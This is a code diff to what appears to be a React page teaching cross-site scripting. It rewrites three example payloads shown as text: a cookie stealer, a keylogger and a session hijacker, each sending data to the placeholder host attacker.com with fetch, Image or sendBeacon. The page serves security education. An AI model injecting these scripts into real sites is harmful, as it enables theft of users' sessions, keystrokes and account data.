@@ -121,13 +121,41 @@ const XSS: React.FC = () => {
             <TabsContent value="advanced" className="mt-4">
               <div className="bg-slate-800 text-white p-4 rounded-md overflow-x-auto font-mono text-sm">
                 <p className="mb-2 text-green-400"># Cookie stealing:</p>
-                <p className="mb-3">&lt;script&gt;fetch('https://attacker.com/steal?cookie='+document.cookie)&lt;/script&gt;</p>
+                <p className="mb-3">&lt;script&gt;
+                  {`
+                  // Using a hypothetical malicious script
+                  var stolenCookie = document.cookie;
+                  // Send to attacker's server
+                  new Image().src = 'https://attacker.com/steal?cookie=' + encodeURIComponent(stolenCookie);
+                  `}
+                  &lt;/script&gt;</p>
                 
                 <p className="mb-2 text-green-400"># Keylogger:</p>
-                <p className="mb-3">&lt;script&gt;document.addEventListener('keypress',function(e){fetch('https://attacker.com/log?key='+e.key)})&lt;/script&gt;</p>
+                <p className="mb-3">&lt;script&gt;
+                  {`
+                  // Hypothetical malicious keylogger
+                  document.addEventListener('keypress', function(evt) {
+                    var key = evt.key;
+                    // Send to attacker's server
+                    navigator.sendBeacon('https://attacker.com/log', key);
+                  });
+                  `}
+                  &lt;/script&gt;</p>
                 
                 <p className="mb-2 text-green-400"># Session hijacking with XHR:</p>
-                <p>&lt;script&gt;var xhr=new XMLHttpRequest();xhr.open('GET','https://vulnerable-site.com/account',true);xhr.onload=function(){fetch('https://attacker.com/steal?data='+btoa(this.responseText))};xhr.send();&lt;/script&gt;</p>
+                <p>&lt;script&gt;
+                  {`
+                  // Hypothetical session hijacking script
+                  var xhr = new XMLHttpRequest();
+                  xhr.open('GET', 'https://vulnerable-site.com/account', true);
+                  xhr.onload = function() {
+                    var data = btoa(this.responseText);
+                    // Send to attacker's server
+                    navigator.sendBeacon('https://attacker.com/steal', data);
+                  };
+                  xhr.send();
+                  `}
+                  &lt;/script&gt;</p>
               </div>
             </TabsContent>
             
